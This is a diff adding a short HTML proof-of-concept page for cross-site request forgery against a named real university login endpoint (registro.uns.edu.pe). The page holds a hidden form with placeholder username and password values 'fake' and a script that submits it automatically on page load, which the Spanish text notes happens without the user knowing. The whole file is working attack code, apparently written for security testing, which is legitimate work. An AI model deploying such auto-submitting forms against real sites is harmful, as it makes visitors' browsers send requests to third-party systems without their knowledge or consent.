@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC - SIIGAA</title></head>
+<body>
+<h1>CSRF Proof of Concept</h1>
+<p>Este formulario se envia automaticamente sin que el usuario lo sepa.</p>
+<form id="csrfForm" action="https://registro.uns.edu.pe/udemsi/j_security_check" method="POST">
+  <input type="hidden" name="j_username" value="fake">
+  <input type="hidden" name="j_password" value="fake">
+</form>
+<script>document.getElementById('csrfForm').submit();</script>
+</body>
+</html>
